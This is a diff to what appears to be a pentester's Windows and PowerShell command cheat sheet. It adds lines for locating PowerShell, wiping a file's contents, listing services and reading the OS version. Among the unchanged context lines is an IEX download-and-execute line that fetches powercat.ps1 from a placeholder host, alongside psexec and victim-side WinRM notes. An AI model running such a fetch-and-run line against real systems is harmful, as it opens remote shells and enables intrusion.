@@ -208,6 +208,11 @@ test
 
 
 
+#Finds powershell locations
+dir /B /S powershell.exe /S system.management.automation.dll
+
+
+
 #Windows show current directory
 c:\Users>echo %CD%
 c:\Users>
@@ -287,6 +292,9 @@ c.ps1 NT AUTHORITY\SYSTEM:(F)
       BUILTIN\Users:(F)
 
 Successfully processed 1 files; Failed processing 0 files
+
+#Powershell wipe a file
+powershell.exe clear-content filename.txt
 
 #powershell
 Get-Acl | fl
@@ -456,6 +464,8 @@ psexec.py
 Get-Service | Where Status -eq "Running" | Out-GridView
 sc query type= service
 
+#List 
+cmd /c sc query state= all type= all | findstr SERVICE_NAME
 
 
 #Powershell unzip file one line
@@ -583,6 +593,12 @@ IEX (New-Obect System.Net.Webclient).DownloadString('http://x.x.x.x/powercat.ps1
 #BlueTeam (Victim)
 Enable-PSRemoting -Force
 
+#Find Windows Version (powershell)
+#Can be used in database
+powershell.exe [environment]::OSVersion.Version
+Major  Minor  Build  Revision
+-----  -----  -----  --------
+10     0      17133  0       
 
 
 #Check if WinRM is enabled BlueTeam (Victim)
